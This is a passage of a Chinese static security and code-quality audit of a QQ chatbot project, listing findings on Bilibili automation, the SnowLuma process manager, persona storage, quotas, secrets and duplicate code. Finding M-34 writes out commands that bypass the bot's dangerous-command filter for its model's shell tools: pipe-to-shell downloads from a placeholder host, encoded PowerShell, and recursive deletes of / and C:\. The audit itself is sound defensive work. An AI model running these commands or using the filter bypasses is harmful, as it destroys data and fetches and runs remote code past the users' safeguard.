- **影响**：面板看不到修改；SQLite 与 Markdown 内容分叉；下一轮提示词可能仍用旧快照，造成“我改了人设但不生效”。
- **修复建议**：把 `personas.js` 缩成 `parsePersona` + `rulesText` 两个纯函数；旧 Markdown 只保留一次性 importer；面板统一走 `persona/service.js`。
- **置信度**：高。

#### M-26｜`compat.save` 允许省略 `editRevision`，绕过乐观锁
- **位置**：`src/persona/service.js:132-139`
- **证据**：`store.saveDraft(id, { layers, name }, { editRevision: editRevision ?? existing.editRevision })`；`store.publish(id, { note: '面板保存' })` 不传 revision。
- **触发条件**：旧面板/客户端调用 `/persona/save` 未带 `editRevision`；并发两个编辑窗口。
- **影响**：后保存覆盖前一次修改（last-write-wins），无 `STALE` 提示。
- **修复建议**：`editRevision` 必填；缺失时使用客户端打开时的版本而不是当前版本；publish 也要带 revision。
- **置信度**：高（代码事实），实际是否发生取决于客户端。

#### M-27｜B 站 `/bili/run` 与 `/bili/replies` 是 GET 副作用且无鉴权
- **位置**：`src/modules/bili/index.js:148-153`、`src/bili/duty.js:325-369`
- **证据**：`api.route('/bili/run', async () => bili.run({ force: true }))` 不读 body、不检查 method；`runRaw` 会搜索、评论、点赞、分享；`/bili/replies` 会回复网友。
- **触发条件**：跨站 `<img>`/预取/面板 API 未授权访问；甚至浏览器地址栏 GET。
- **影响**：以机器人 B 站账号发布评论/回复/点赞，产生不可撤回的外部副作用；属于**重复发送/配额绕过**的入口。
- **修复建议**：统一改为 `POST` + owner/CSRF 校验；`run` 必须区分“自动/手动”并复用同一 quota；`replies` 同理。
- **置信度**：高（代码事实）。

#### M-28｜`run({force:true})` 绕过 `maxRunsPerDay`
- **位置**：`src/bili/duty.js:325-328`、`src/modules/bili/index.js:152`
- **证据**：`if (!force && q.runs >= c.maxRunsPerDay) return ...`；面板路由永远 `force:true`。
- **触发条件**：反复点击面板“立即浏览”。
- **影响**：一天内无限运行，超出 `maxRunsPerDay` 配额，增加 B 站风控/封号风险；属于**配额绕过**。
- **修复建议**：`force` 只允许跳过时间间隔，不跳过日额度；或增加独立 `manualRuns` 上限并二次确认。
- **置信度**：高。

#### M-29｜B 站自动浏览不检查 `pauseReason`，风控停不下来
- **位置**：`src/bili/duty.js:453-463`
- **证据**：`if (c.autoBrowse && q.runs < c.maxRunsPerDay && now() - s.lastRun > ... ) await run()`；没有 `q.pauseReason` 条件。评论失败设置 `-352` 风控后，autoBrowse 仍会执行，若开启 `like` 还会继续点赞。
- **触发条件**：B 站返回 `-352/-509` 等暂停码后。
- **影响**：持续触发风控，可能升级封禁。
- **修复建议**：`tick` 中 `if (q.pauseReason) return`；`likeVideo` 也检查暂停；恢复需手动确认。
- **置信度**：高。

#### M-30｜B 站回复在提交前写入 `repliedFeed`，失败永久跳过
- **位置**：`src/bili/duty.js:359-367`
- **证据**：
  ```js
  if (!ctx.dryRun) { s.repliedFeed = [...s.repliedFeed, String(x.id)].slice(-300); save(ctx, s) }
  if (!text || isSilence(text)) continue
  const r = await post(ctx, s, q, ...)
  ```
- **触发条件**：`post` 因 `BILI_CANCELED`、网络/未知结果失败，或配额耗尽提前 break。
- **影响**：该回复被记为已处理，以后不再尝试；用户看到的回复可能永远没有回应。
- **修复建议**：只在 `post` 明确 `delivered` 或 `duplicate` 后写入 `repliedFeed`；失败保留待重试队列；未知结果单独标记。
- **置信度**：高。

#### M-31｜SnowLuma `findRunningPid` 用字符串前缀判断进程路径，可能杀错进程
- **位置**：`src/snowluma/manager.js:409-417`
- **证据**：`return path.toLowerCase().startsWith(inst.dir.toLowerCase()) ? pid : 0`；例如 `C:\Aurabot\snowluma-old\...` 也会匹配 `C:\Aurabot\snowluma`。
- **触发条件**：同盘存在同名前缀目录且占用 `webuiPort`。
- **影响**：`resetPassword()` 会 `process.kill(pid)` 杀错进程。
- **修复建议**：比较规范化路径 + 分隔符边界（`path === dir || path.startsWith(dir + '\\')`），并校验进程名/命令行。
- **置信度**：高（逻辑）。

#### M-32｜SnowLuma `stop`/`dispose` 只 kill 根进程，不等待、不杀树
- **位置**：`src/snowluma/manager.js:301-307`、`:503-506`
- **证据**：`try { child.kill() } catch {}`；没有 `await exit`、没有进程组/job object。
- **触发条件**：SnowLuma 内部再 spawn QQ/浏览器子进程，或 Windows 下 SIGTERM 不递归。
- **影响**：端口/文件句柄残留、僵尸进程；下次启动出现“端口被占/控制台旧进程”。
- **修复建议**：Windows 使用 `taskkill /T /F` 或 job object；等待 `exit` 并超时升级；`dispose` 做同样清理。
- **置信度**：高。

#### M-33｜SnowLuma 密码可从面板路由明文读出
- **位置**：`src/snowluma/manager.js:490-491`、`src/host.js:602`
- **证据**：`password: () => cfg().webuiPassword || ''`；`route('/snowluma/password', async () => ({ ok: true, password: snowluma.password(), ... }))`。
- **触发条件**：能访问面板 API 的客户端；若面板绑定 0.0.0.0/被反代，即远程读取。
- **影响**：SnowLuma 控制台密码泄露，可进而调用 `/api/processes` 注入任意 QQ 进程（与 M-10 组合）。
- **修复建议**：不要提供“显示密码”接口；仅提供“重置/测试登录”；如必须显示，要求最近一次 QQ 主人确认 + 短期 token。
- **置信度**：高（代码事实），风险取决于面板暴露面。

#### M-34｜danger.js 可被多种方式绕过（引号/编码/别名/管道/PowerShell）
- **位置**：`src/security/danger.js:16-33`（规则）、`:36-39`（纯正则）、`:94-113`（只覆盖 `bash`/`pwsh`，无 chatId 直接放行）
- **可复现绕过（静态推演）**：
  - `"rm" -rf /`：正则 `\brm\s+` 要求 `rm` 后直接空白，引号使其不匹配。
  - `rm -rf -- /`：选项组不接受 `--` 终止符。
  - `curl -fsSL https://x | /bin/bash`：`(?:ba|z|k|da)?sh` 不匹配 `/bin/bash`。
  - `wget -qO- https://x | env bash`：管道后多了 `env`。
  - `powershell -NoProfile -EncodedCommand <base64>`：没有对应规则。
  - `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')`：没有 `| iex`，不匹配第 25 条。
  - `del /q/f/s C:\*`：`(?:\/[a-z]+\s+)*` 要求每个参数后有空格，`/q/f/s` 不匹配。
  - `chmod -R a+rwx /`：只匹配 `0?777`。
  - 别名/函数/`bash -c "$(base64 -d ...)"`：无解析能力。
- **触发条件**：`security.dangerConfirm=true` 且模型/攻击者在 `bash`/`pwsh` 中执行上述命令。
- **影响**：危险命令确认被绕过；模块自己在文件头也声明“正则挡不住 base64、脚本文件和别名，这不是沙箱”，但当前默认关闭、用户开启后容易误以为安全。
- **修复建议**：不要把它宣传成安全边界；用命令 AST/allowlist（如 shell-quote + 拒绝未知命令）或真正沙箱；至少补充引号归一化、`--`、`/bin/bash`、`env bash`、PowerShell encoded/`IEX` 规则；对未绑定 chatId 的会话默认 deny 而不是 `next()`。
- **置信度**：高（绕过示例按当前正则静态判断）。

#### M-35｜模块开关与业务开关双轨，状态组合不明确
- **位置**：`src/core/modules.js:176-178`（`modules[id].enabled`）、`src/modules/imagegen/index.js:41`（`imageGen.enabled`）、`src/modules/song/index.js:1146`（`g.modules?.song?.enabled === false` 与 `c.enabled`）、`src/modules/bili/index.js:455`（`c.enabled` + module）、`src/core/config.js:94-110`（`stickers` 各开关）
- **证据**：同一功能至少有 `modules.<id>.enabled`、顶层 `<feature>.enabled`，部分模块还检查 `g.modules?.<id>?.enabled === false`，部分只检查其中一个；`mods.status()` 只报告模块开关，不报告顶层功能开关。
- **触发条件**：用户在面板关闭“生图”但模块仍运行，再通过 `/imagegen/submit` 提交（M-08）；或关闭模块但顶层 `enabled` 仍 true，重新启用后自动任务立刻恢复。
- **影响**：用户以为关闭但仍有副作用；排查困难；权限/成本控制失效。
- **修复建议**：统一为 `modules[id].enabled` 作为唯一运行开关，功能级开关改名 `features.<id>.mode` 并在 UI 显示组合状态；所有入口检查同一个 `isFeatureEnabled()`。
- **置信度**：高。

#### M-36｜`api.settings()`（`config.ext[id]`）与内置模块顶层 config 是两套配置
- **位置**：`src/core/modules.js:220-225`、`:357-361`；`src/modules/API.md:36`（说明值存 `config.ext[id]`）
- **证据**：`settings: () => ({ ...(def.defaults || {}), ...(getConfig().ext?.[id] || {}) })`；`saveSettings` 只写 `ext`；内置模块的 `stickers/voice/imageGen/song/bili` 都读写顶层 `config.<feature>`，`def.defaults` 对内置模块没有对应项。
- **触发条件**：用户 fork 内置模块后想用 `api.settings()` 读取原内置配置，或面板用通用设置表单保存到 `ext`。
- **影响**：fork/替换模块读不到内置配置；两个面板可能显示不同值；更新覆盖或丢失。
- **修复建议**：内置模块也声明 `defaults` 并把配置映射到 `ext`，或提供 `api.featureConfig(id)` 统一读取；面板只保留一套。
- **置信度**：高。

#### M-37｜普通回复/语音发送没有稳定 `batchId`，外部重试可能重复发送
- **位置**：`src/chat/hub.js:578-590`（`sendItemsNow` 的 `stableBatchId` 可为 undefined）、`src/delivery/outbox.js:62`（无 batchId 时 `newId('obx')`）、`src/chat/hub.js:927`（普通群发不传 batchId）
- **证据**：
  ```js
  const batchId = outbox.enqueue({ batchId: stableBatchId, chatId, requestId, epoch, items, requiresGuard: ... })
  ...
  function enqueue({ batchId = newId('obx'), chatId, ... })
  ```
  `deliver()` 的普通 text/voice 调用只传 `{ epoch, requestId, shouldSend, signal }`；没有 `batchId`。
- **触发条件**：同一 `deliver` 被外部重试（例如插件捕获异常后重放、上层重复调用 `sendVoiceFile`）或未来在恢复逻辑中重放普通回复。
- **影响**：outbox 无法识别“同一批已发送”，可能重复发文字/语音/文件；属于**重复发送风险**（sticker/image/song 已有稳定 batchId，普通回复没有）。
- **修复建议**：所有 `sendItems` 调用必须传稳定 `batchId`（例如 `turnId:seq`/`requestId:kind`）；`sendVoiceFile`/`sendText` 也接受并透传。
- **置信度**：中（设计缺口，非已复现的默认路径 bug）。

### P3

#### M-38｜表情库 N+1 查询与全表 JSON 解析，规模大时每轮变慢
- **位置**：`src/stickers/repository.js:28`、`:36-42`；`src/stickers/store.js:101-105`、`:142-148`
- **证据**：`all(true)` 每次读全部 `body_json` 并 `JSON.parse`；`decorate()` 每项调用 `repo.usage` + `repo.qq` 两次；`available()` 每次消息/决策都调用 `library()`。
- **触发条件**：库接近 `maxLibrary`（默认 300，配置可达 2000），群聊每条消息都触发决策。
- **影响**：CPU/DB 查询线性增长；面板列表卡顿；消息响应变慢。
- **修复建议**：把 `usage`/`qq` 合并到 SQL join；`available` 只查 approved/stored 的索引行；缓存库版本号，变更时失效。
- **置信度**：高。

#### M-39｜`maxLibrary` 配置归一化上限 2000，store 却允许 20000；`trim()` 是空实现
- **位置**：`src/core/config.js:270`（`num(..., 20, 2000)`）、`src/stickers/store.js:34`（clamp `1, 20000`）、`:847`（`trim` 返回 removed 0）；`src/stickers/selection.js:81-84`（`pickEvict` 未被调用）
- **影响**：配置值语义不一致；面板/文档以为有淘汰策略，实际只有“满库停止接收”；`pickEvict` 是死代码。
- **修复建议**：统一上限与行为；要么实现 LRU 淘汰（使用 `pickEvict`），要么删除 `trim`/`pickEvict` 以免误用。
- **置信度**：高。

#### M-40｜生图每日配额按 UTC 日界，B 站按本地日界
- **位置**：`src/jobs/runner.js:11`、`:76-78`；`src/bili/duty.js:16`、`:113-117`
- **证据**：`dayOf = (t) => new Date(t).toISOString().slice(0,10)`（UTC）；B 站 `dayKey` 使用 `getFullYear/getMonth/getDate`（本地）。
- **触发条件**：非 UTC 时区（本项目 Asia/Shanghai）。
- **影响**：生图额度在中国时间 08:00 重置，用户以为 00:00；跨时区部署行为不一致。
- **修复建议**：统一使用配置时区/本地日界，`dayOf(t, timeZone)`；配额表记录 timezone 版本。
- **置信度**：高。

#### M-41｜B 站回复/评论文本静默截断到 200 字
- **位置**：`src/bili/duty.js:258`（`const outgoing = text.slice(0, 200)`）
- **影响**：用户要求的长评论被截断，B 站实际支持更长；模型/用户看不到截断提示。
- **修复建议**：按 B 站限制（约 1000 字）校验并拒绝超长，或在面板显示截断；不要静默截断。
- **置信度**：高。

#### M-42｜B 站 API `r.json()` 无响应大小上限
- **位置**：`src/bili/api.js:70-87`、`:101-109`、`:134-143`
- **影响**：恶意/异常 B 站响应可能让进程分配巨大内存；B 站正常响应通常有界，但不是代码保证。
- **修复建议**：用 `request` 风格的有界流式读取（参考 `providers/image/common.request`）；限制 2-8MB。
- **置信度**：中。

#### M-43｜`loadLib()` 静默吞掉内部文件 import 错误
- **位置**：`src/core/modules.js:44-48`
- **证据**：`try { libCache.set(...) } catch (error) {}`；之后 `lib()` 只报“没有这个文件”。
- **影响**：内部模块语法错误/依赖错误被伪装成“文件不存在”，排查困难；扩展模块可能静默缺功能。
- **修复建议**：收集错误并在 `lib()` 抛出原始原因；启动时 `log.warn` 每个失败文件。
- **置信度**：高。

#### M-44｜`fork()` 用 basename 作为复制文件名，可能覆盖同名文件
- **位置**：`src/core/modules.js:715-725`
- **证据**：`own.set(f, f.split('/').pop())`；如果 `files` 列表里有不同目录下的 `index.js`/`common.js`，后一个覆盖前一个。
- **影响**：fork 出来的模块内容缺失/夹带错误文件，启动失败或行为错误。
- **修复建议**：保留相对目录结构（`join` 子目录），或检测 basename 冲突并报错。
- **置信度**：中。

#### M-45｜SnowLuma `running()` 把任意 HTTP 响应都当“在运行”
- **位置**：`src/snowluma/manager.js:217-224`
- **证据**：`return r.status > 0`；401/404/500 都算 running。
- **影响**：端口被别的服务占用时，`start()` 直接返回“已经在运行”，不检查 OneBot，用户以为已启动。
- **修复建议**：检查 `/api/status` JSON 或 200 + 预期字段；失败时区分“端口被占”。
- **置信度**：高。

#### M-46｜`toMono16k` 未验证 WAV 的 channels/rate，畸形文件可触发异常/大分配
- **位置**：`src/voice/wav.js:41-50`、`src/chat/hub.js:1162`、`:1201`
- **证据**：`frames = Math.floor(data.length / (2 * channels))`；`outLen = Math.max(1, Math.floor(frames * target / rate))`；`channels=0`/`rate=0` 会得到 `Infinity`，`new Float64Array(Infinity)`/`new Int16Array(Infinity)` 抛 RangeError；`parseWav` 不校验 `fmt.channels/rate`。
- **触发条件**：QQ 网关/本地接口返回畸形 WAV。
- **影响**：单条语音识别失败；在 `localTranscribe` 路径异常可能冒泡到调用方；极端情况下内存分配尝试。
- **修复建议**：`parseWav` 校验 `channels 1..32`、`rate 8000..384000`、`data` 长度；`toMono16k` 同样 fail fast。
- **置信度**：高。

#### M-47｜死代码/兼容层清单（详见第 4 节）
- `src/stickers/selection.js:72-84` 的 `parseSelection`/`pickEvict` 仅测试使用；
- `src/stickers/store.js:847` `trim` 空实现；
- `src/features/companion.js:70-143` 整套旧 `createMood`（全局 `mood.json`）未被 `modules/mood` 使用；
- `src/persona/personas.js:40-80` 的 `listPersonas/readPersona/savePersona/deletePersona/currentPersonaText` 与 `persona/service.js` 双轨；
- `src/providers/image/*` 的 `finish`/capability 重复；
- `src/song/studio.js` 安装器大段逻辑与 `modules/song/index.js` 路由重复。

---

## 3. 特别标注（按要求）

### 3.1 命令注入 / 路径穿越
- **未发现** `spawn(..., {shell:true})` 或字符串拼接 shell 的调用点；`song/studio.run`、`bili/frames.decode`、`stickers/preview`、`voice/ASR ffmpeg` 都使用参数数组 + `shell:false`（默认）。
- **唯一的任意本地文件入口**：`song.request({file})` → `process1` 直接 `job.file`（`M-21`），以及 `local.toImageBuffer`/`sendVoiceFile` 对插件脚本返回路径的信任（本地脚本本身拥有代码执行权，属于信任边界内）。
- **最接近命令注入的是 danger.js 的规则绕过**（`M-34`），它不是真正的执行器，但会让“危险命令确认”失效。
- **路径穿越**：`stickers/legacy` 已用 `realpath` + 前缀校验（`legacy.js:21-22`），`song/importModels` 用 `safeName`（`studio.js:283,295`），未发现直接穿越；SnowLuma 的路径前缀误判是“误杀”类路径问题（`M-31`），不是外部可控穿越。

### 3.2 密钥泄漏
- `image_job_configs.profile_json` 明文含 `apiKey`（`M-15`）；
- `api.config()` 对任意模块返回完整配置（含 `voice.openai.apiKey`、`voice.httpApi.apiKey`、`snowluma.webuiPassword`、`bili.cookie`、`song.neteaseCookie`、`imageGen.profiles[].apiKey`），见 `core/modules.js:218`；第三方/被篡改模块可直接读。
- `/snowluma/password` 返回明文控制台密码（`M-33`）。
- `publicConfig` 的面板脱敏本身是正确的（`core/config.js:532-540`），但上述 DB/模块路径绕过了它。

### 3.3 重复发送
- 普通 text/voice 的 outbox 没有稳定 `batchId`（`M-37`），外部重试可能重复；
- `hub.sendSticker` 兼容入口永远 EMPTY_REPLY（`M-14`），不会发，但若未来修成可发而调用方重试，也缺少稳定 batch；
- `imagegen`/`song` 已有 `image:<jobId>`/`song:<jobId>` 稳定 batch，`outbox.retry` 只补 `failed(not_sent/rejected)`/`skipped`，不会重发 `unknown`，这部分设计是对的。

### 3.4 配额绕过
- `/bili/run` 的 `force:true` 绕过 `maxRunsPerDay`（`M-28`）；
- B 站 `quotaFile` 以 `[account, cookie]` 做 key，换 Cookie 会重置日配额（`duty.js:110-117`），可被有面板权限的人绕过；
- 生图 `perProviderPerDay` 以 `job.profileId` 计数是正确的（`jobs/image.js:226`），但 `/imagegen/submit` 绕过 `imageGen.enabled` 后仍可消耗所有配额（`M-08`）；
- 表情 `maxPerHour` 使用 `sticker_quota` 预留行，未发现直接绕过；`maxLibrary` 只阻止新增、不淘汰（`M-39`）。

### 3.5 静默失败
- `processImport` `catch { failed++ }`（`M-13`）；
- `sticker decision` catch 只写 DB reason，没有 log（`decision.js:343-356` 无 `log` 注入）；
- `imagegen` `announceFailures` 里 `hub.sendText(...).catch(() => {})`（`jobs/image.js:366`）会吞掉失败通知；
- `loadLib` 空 catch（`M-43`）；
- `voice` RVC fallback 仅在日志记录，用户无感（`M-18`）。

---

## 4. 可删除/合并的重复实现清单（按优先级）

| 优先级 | 重复项 | 位置 | 处理建议 |
|---|---|---|---|
| P1 | 四套网络下载实现：SSRF-safe `fetchImage` / provider `request` / TTS `fetchBytes` / song `fetch` | `src/core/net.js:75-98`、`src/providers/image/common.js:171-225`、`src/voice/tts.js:29-57`、`src/song/studio.js:750` | 抽 `safeHttpFetch({allowLocal, maxBytes, redirect:'error', dnsPin})`；默认全部走 `core/net`；修完 M-05/M-09/M-20 |
| P1 | 三套 ffmpeg 取帧：stickers preview / image-frames / bili frames | `src/stickers/preview.js:51-77`、`src/runtime/image-frames.js:133-228`、`src/bili/frames.js:5-34` | 合并成一个 `ffmpegFrame({bytes,filter,limits})`；统一 `-protocol_whitelist pipe`、超时、输出上限、进程树清理 |
| P1 | 旧 mood 整套 `createMood`（全局 `mood.json`） | `src/features/companion.js:70-143` | 删除旧实现，把 `createSpeakUp` 移到 `features/speakup.js`；避免未来误 import 绕过 scope/evidence |
| P2 | 旧 Markdown 人格 CRUD | `src/persona/personas.js:40-80` | 只保留 `parsePersona`/`rulesText`；CRUD 全部走 `persona/store.js`；旧文件只作为一次性导入源 |
| P2 | 五个 image adapter 各自 `finish`/capability 合并 | `src/providers/image/openai.js:16-27`、`gemini.js:58-100`、`comfyui.js:29-44,191-220`、`studio.js:99-105,179-205`、`http.js:131-165` | 提取 `mergeCaps` + `parseOutputs` + `validateReq` 公共函数；Gemini/HTTP 补 `checkRequest` |
| P2 | 模块路由样板/管理权限 | `src/modules/stickers/index.js:15-19`、`modules/imagegen/index.js:275-342`、`modules/bili/index.js:148-153`、`modules/song/index.js:94-124` | 统一 `defineAdminRoute({method, scope})`，集中 owner/CSRF/method 检查 |
| P3 | 表情 `parseSelection`/`pickEvict`/`DEFAULT_TAGS`/`trim` | `src/stickers/selection.js:72-84`、`store.js:847` | 未被生产代码调用（仅测试）；删除或实现真正淘汰 |
| P3 | `features/stickers.js` / `features/memory.js` 兼容 shim | `src/features/stickers.js:1-5`、`features/memory.js:1-2` | 保留一个版本周期后删除；新增代码直接 import 领域实现 |
| P3 | `persona/service.compat` 旧面板兼容层 | `src/persona/service.js:123-157` | 等旧面板迁移到 draft/publish 接口后删除；当前至少补 `editRevision` 必填 |

---

## 5. 文件规模与代码质量

| 文件 | 行数 | 问题 |
|---|---:|---|
| `src/chat/hub.js` | 2302 | 最大单文件：入站解析、会话、Agent 挂载、发送、outbox、贴纸决策、ASR、命令、事件全在一个闭包里；建议按 inbound / outbound / session / stickers 拆 |
| `src/song/studio.js` | 1198 | 安装器（uv/Python/Applio/模型下载）+ 任务 handler + ffmpeg/RVC 混在一个文件；安装器应单独 `song/installer.js` |
| `src/stickers/store.js` | 849 | 领域服务 + 队列 + 面板路由 + 决策注入；建议拆 `collect-service`/`queue-service` |
| `src/core/modules.js` | 793 | 模块生命周期 + 路由 + 配置 + fork；路由鉴权应独立一层 |
| `src/migrate/restore.js` | 788 | 迁移/恢复逻辑大；与本次媒体域弱相关 |
| `src/memory/vector/integration/service.js` | 644 | 非本域，作规模参考 |
| `src/core/config.js` | 627 | 默认值 + 归一化 + 面板脱敏 + 合并；可拆 schema/defaults/normalize |
| `src/jobs/runner.js` | 592 | 设计强但复杂；租约/配额/恢复都在一个文件 |
| `src/runtime/media-analysis.js` | 539 | 媒体分析 queue + handler；与 stickers 分析有重复的视觉调用模式 |
| `src/snowluma/manager.js` | 508 | 启动/attach/密码/安装位置/进程发现混合 |
| `src/bili/duty.js` | 483 | 业务 + 配额 + 面板状态混合 |
| `src/providers/image/common.js` | 476 | 公共网络/图片解析；应成为唯一下载层但目前未被所有 adapter 使用 |

---

## 6. 建议修复顺序

1. **P1 安全边界**：M-07（模块路由鉴权）→ M-06（资产 IDOR）→ M-05/M-09/M-20（SSRF）→ M-08（生图开关/allow 绕过）→ M-10/M-33（SnowLuma 注入与密码）。
2. **P1 数据/状态**：M-03（ready 卡死）→ M-02（legacy 账号隔离）→ M-01（账号库共享策略）→ M-04（识别超时硬 race）。
3. **P2 关键行为**：M-15（密钥落库）→ M-16/M-17（能力/蒙版）→ M-18（RVC 降级）→ M-24（bindingRevision）→ M-27/M-28/M-29/M-30（B 站）。
4. **P2 稳定性/资源**：M-22（zip）、M-23（子进程/磁盘）、M-13（静默失败）、M-37（batchId）。
5. **P3 质量**：M-38/M-39（贴纸性能/配置）、M-40（日界）、M-43~M-46、重复实现清理。

> 说明：本次为静态只读审计，未对真实 QQ/B 站/生图服务发起请求，因此“可利用性”按代码路径与部署条件给出；所有修复建议均可在不改变现有领域模型的前提下实施。
